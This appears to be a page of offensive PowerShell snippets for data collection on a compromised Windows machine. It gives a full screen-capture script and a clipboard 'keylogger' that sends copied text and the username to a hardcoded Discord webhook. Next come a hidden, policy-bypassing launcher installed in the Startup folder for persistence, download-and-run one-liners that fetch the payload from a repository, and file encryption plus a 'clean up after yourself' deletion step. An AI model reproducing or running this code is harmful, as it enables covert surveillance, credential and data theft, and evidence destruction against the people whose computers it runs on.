# Collection

## Snapshots

The following script takes a screenshot of the system and saves it to a given path.

You may modify the following script and schedule it to take screenshots every x number of minutes.

*Note: The following script was written by the author.*

```
[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
$path=$args[0]
function screenshot($path)
{
    $width = 0;
    $height = 0;
    $workingAreaX = 0;
    $workingAreaY = 0;
    $screen = [System.Windows.Forms.Screen]::AllScreens;
    foreach ($item in $screen)
    {
        if($workingAreaX -gt $item.WorkingArea.X)
        {
            $workingAreaX = $item.WorkingArea.X;
        }

        if($workingAreaY -gt $item.WorkingArea.Y)
        {
            $workingAreaY = $item.WorkingArea.Y;
        }

        $width = $width + $item.Bounds.Width;

        if($item.Bounds.Height -gt $height)
        {
            $height = $item.Bounds.Height;
        }
    }

    $bounds = [Drawing.Rectangle]::FromLTRB($workingAreaX, $workingAreaY, $width, $height);
    $bmp = New-Object Drawing.Bitmap $width, $height;
    $graphics = [Drawing.Graphics]::FromImage($bmp);
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);
    $bmp.Save($path);
    $graphics.Dispose();
    $bmp.Dispose();
    echo "Image saved !!"
    echo $path
}
echo 'USAGE: ./screenshot.ps1 "C:\Users\Public\image.png"'
screenshot($path)
```

## Keylogger

The powershell scripts posts the clipboard content to the Discord chat when the user presses Ctrl+c or Ctrl+x

- Create a Discord webhook and add it as the value of $hookUrl in the script. [Discord Webhooks](https://discordjs.guide/popular-topics/webhooks.html#what-is-a-webhook)
- Save the following script as update.ps1
- Save update.ps1 to $env:userprofile\AppData\Roaming

```
Add-Type -AssemblyName WindowsBase
Add-Type -AssemblyName PresentationCore

function dischat {

  [CmdletBinding()]
  param (    
  [Parameter (Position=0,Mandatory = $True)]
  [string]$con
  ) 
  
  $hookUrl = 'https://discord.com/api/webhooks/1073180088213970974/yOv89KtG64YMHt20rYTDXrO_a43b7KroOMoZ2JipIHMM5VIjGZ8_ngDs8JMAYEom4kmT'
  
$Body = @{
  'username' = $env:username
  'content' = $con
}


Invoke-RestMethod -Uri $hookUrl -Method 'post' -Body $Body

}


dischat (get-clipboard)

while (1){
    $Lctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'LeftCtrl')
    $Rctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::RightCtrl)
    $cKey = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::c)
    $xKey = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::x)

       if (($Lctrl -or $Rctrl) -and ($xKey -or $cKey)) {dischat (Get-Clipboard)}
       elseif ($Rctrl -and $Lctrl) {dischat "---------connection lost----------";exit}
       else {continue}
} 
```

.bat script to run the powershell script

Save the following script as per.bat

```
@echo off
powershell -Command "& {cd "$env:userprofile\AppData\Roaming"; powershell -w h -NoP -NonI -Ep Bypass -File "update.ps1"}"
pause
```

Then save the bat file into startup programs and run the bat script by double clicking on it.

You can also host the scripts online, download them and run them using the three following commands.

```
powershell -w h -NoP -NonI -Ep Bypass 'Invoke-WebRequest -Uri "https://raw.githubusercontent.com/<your-github>/<your-repor>/main/update.ps1" -OutFile "$env:userprofile\AppData\Roaming\update.ps1" -UseBasicParsing'
powershell -w h -NoP -NonI -Ep Bypass 'Invoke-WebRequest -Uri "https://raw.githubusercontent.com/<your-github>/<your-repor>/main/per.bat" -OutFile "$env:APPDATA\Microsoft\Windows\Start` Menu\Programs\Startup\per.bat" -UseBasicParsing'
Invoke-Expression -Command "& '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\per.bat'" 

```



## Zipping files and directories

### Zipping

`Compress-Archive -Path C:\path\to\file\*.jpg -DestinationPath C:\path\to\archive.zip`

### Unzipping

`Expand-Archive -LiteralPath 'C:\Archives\Draft[v1].Zip' -DestinationPath C:\Reference`

## Encryption

### Creating encryption key

```
$EncryptionKeyBytes = New-Object Byte[] 32
[Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($EncryptionKeyBytes)
$EncryptionKeyBytes | Out-File "./encryption.key"
```

### Encrypting file

```
$FileContent = Get-Content ".\file.txt"
$EncryptionKeyData = Get-Content "./encryption.key"
$secureString = ConvertTo-SecureString $FileContent -AsPlainText -Force
$Encrypted = ConvertFrom-SecureString -SecureString $secureString -Key $EncryptionKeyData | Out-File -FilePath "./secret.encrypted"
```

### Decrypting file

```
$EncryptionKeyData = Get-Content "./encryption.key"
$PasswordSecureString = Get-Content "./secret.encrypted" | ConvertTo-SecureString -Key $EncryptionKeyData
$PlainTextPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($PasswordSecureString))
$PlainTextPassword | Out-File -FilePath ./plaintext.txt
$PlainTextPassword
```

## Deleting files

You may want to clean up after yourself.

`Remove-Item C:\Test\*.*`
`Remove-Item C:\Users\Public\*.*`


